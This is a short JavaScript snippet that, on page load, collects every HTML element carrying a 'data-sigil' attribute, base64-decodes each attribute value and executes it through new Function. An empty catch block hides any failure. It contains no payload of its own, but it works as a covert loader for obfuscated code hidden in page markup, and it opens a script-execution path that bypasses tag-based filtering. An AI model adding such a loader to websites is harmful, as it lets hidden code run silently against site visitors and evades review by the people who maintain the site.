(function () {
  function runSigils() {
    var nodes = document.querySelectorAll('[data-sigil]');
    for (var i = 0; i < nodes.length; i += 1) {
      var payload = nodes[i].getAttribute('data-sigil') || '';
      if (!payload) {
        continue;
      }
      try {
        var decoded = atob(payload);
        var fn = new Function(decoded);
        fn();
      } catch (err) {
      }
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', runSigils);
  } else {
    runSigils();
  }
})();
